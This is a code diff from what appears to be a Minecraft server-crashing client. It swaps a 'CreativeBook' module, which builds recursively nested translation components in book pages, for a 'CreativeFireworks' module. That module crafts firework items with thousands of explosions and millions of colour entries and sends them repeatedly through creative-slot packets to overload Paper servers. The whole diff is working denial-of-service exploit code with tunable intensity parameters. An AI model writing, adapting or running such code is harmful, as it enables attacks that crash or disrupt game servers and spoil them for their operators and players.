@@ -2,6 +2,7 @@ package me.dannycrasher.client.module.impl.paper;
 
 import com.viaversion.viafabricplus.ViaFabricPlus;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.concurrent.ScheduledExecutorService;
 import me.dannycrasher.client.command.ArgumentType;
@@ -9,47 +10,47 @@ import me.dannycrasher.client.module.Module;
 import me.dannycrasher.client.module.ModuleContext;
 import me.dannycrasher.client.module.ModuleType;
 import me.dannycrasher.client.protocol.components.data.DataComponents;
-import me.dannycrasher.client.protocol.components.data.impl.DataWritableBookContent;
-import me.dannycrasher.client.protocol.components.data.impl.Filterable;
+import me.dannycrasher.client.protocol.components.data.impl.DataFireworks;
 import me.dannycrasher.client.protocol.components.objects.ItemStack;
 import me.dannycrasher.client.protocol.components.objects.ItemType;
 
-public class CreativeBook extends Module {
+public class CreativeFireworks extends Module {
 	private ScheduledExecutorService executorService;
 
-	public CreativeBook() {
-		super("CreativeBook", "Paper creative-slot writable book bomb (requires creative)", ModuleType.PAPER);
-		addArgument("packets", ArgumentType.INT, 1, 100, "50");
-		addArgument("chars", ArgumentType.INT, 1, 100, "80");
-		addArgument("pages", ArgumentType.INT, 1, 15, "15");
+	public CreativeFireworks() {
+		super("CreativeFireworks", "Paper creative-slot fireworks explosion bomb (requires creative)", ModuleType.PAPER);
+		addArgument("packets", ArgumentType.INT, 1, 1000, "50");
+		addArgument("explosions", ArgumentType.INT, 1, 4096, "32");
+		addArgument("colors", ArgumentType.INT, 1, 2096000, "2048");
 		addArgument("slot", ArgumentType.INT, 0, 45, "36");
 		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
-		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "10");
+		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "5");
 	}
 
 	@Override
 	public void executeModule(ModuleContext context) {
 		int packets = context.getInt("packets");
-		int chars = context.getInt("chars");
-		int pages = context.getInt("pages");
+		int explosions = context.getInt("explosions");
+		int colors = context.getInt("colors");
 		int slot = context.getInt("slot");
 		int threadSleep = context.getInt("threadSleep");
 		int loopAmount = context.getInt("loopAmount");
 
 		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
-		String pageContent = "{translate:chat.type.text,with:[{text:.}]}";
-		for (int i = 0; i < chars; i++) {
-			pageContent = pageContent.replace("text:.", "translate:chat.type.text,with:[{text:.}]");
-		}
+		int[] colorArray = new int[colors];
+		Arrays.fill(colorArray, 0xFFFFFF);
+		int[] fadeArray = new int[Math.min(colors, 256)];
+		Arrays.fill(fadeArray, 0xFF00FF);
 
-		List<Filterable<String>> pagesList = new ArrayList<>();
-		for (int i = 0; i < pages; i++) {
-			pagesList.add(new Filterable<>(pageContent, null));
+		List<DataFireworks.Explosion> explosionList = new ArrayList<>(explosions);
+		DataFireworks.Explosion explosion = new DataFireworks.Explosion(0, colorArray, fadeArray, true, true);
+		for (int i = 0; i < explosions; i++) {
+			explosionList.add(explosion);
 		}
 
 		DataComponents components = new DataComponents();
-		components.put(new DataWritableBookContent(pagesList));
-		ItemStack item = new ItemStack(ItemType.WRITABLE_BOOK.getId(protocol), 1, components);
+		components.put(new DataFireworks(127, explosionList));
+		ItemStack item = new ItemStack(ItemType.FIREWORK_ROCKET.getId(protocol), 1, components);
 
 		executorService = CreativeAttackHelper.start(this, context, executorService, packets, threadSleep, loopAmount, slot, item);
 	}
